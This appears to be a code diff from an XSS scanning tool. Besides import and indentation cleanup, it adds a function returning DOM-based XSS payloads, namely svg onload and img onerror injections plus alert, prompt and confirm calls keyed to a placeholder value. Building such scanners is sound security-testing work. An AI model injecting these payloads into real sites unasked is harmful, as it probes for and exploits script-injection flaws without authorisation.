@@ -1,8 +1,8 @@
 package scanning
 
 import (
-	"encoding/json"
 	"bufio"
+	"encoding/json"
 	"io/ioutil"
 	"net/http"
 	"strings"
@@ -174,12 +174,12 @@ func getSSTIPayload() []string {
 }
 
 func splitLines(s string) []string {
-    var lines []string
-    sc := bufio.NewScanner(strings.NewReader(s))
-    for sc.Scan() {
-        lines = append(lines, sc.Text())
-    }
-    return lines
+	var lines []string
+	sc := bufio.NewScanner(strings.NewReader(s))
+	for sc.Scan() {
+		lines = append(lines, sc.Text())
+	}
+	return lines
 }
 
 // getAssetHahwul is pull data and information for remote payloads
@@ -475,4 +475,15 @@ func getInJsPayload(ip string) []string {
 	}
 	return payload
 
+}
+
+func getDOMXSSPayload() []string {
+	payload := []string{
+		"<svg/OnLoad=\"`${prompt`DALFOX_ALERT_VALUE`}`\">",
+		"<img/src/onerror=.1|alert`DALFOX_ALERT_VALUE`>",
+		"alert(DALFOX_ALERT_VALUE)",
+		"prompt(DALFOX_ALERT_VALUE)",
+		"confirm(DALFOX_ALERT_VALUE)",
+	}
+	return payload
 }
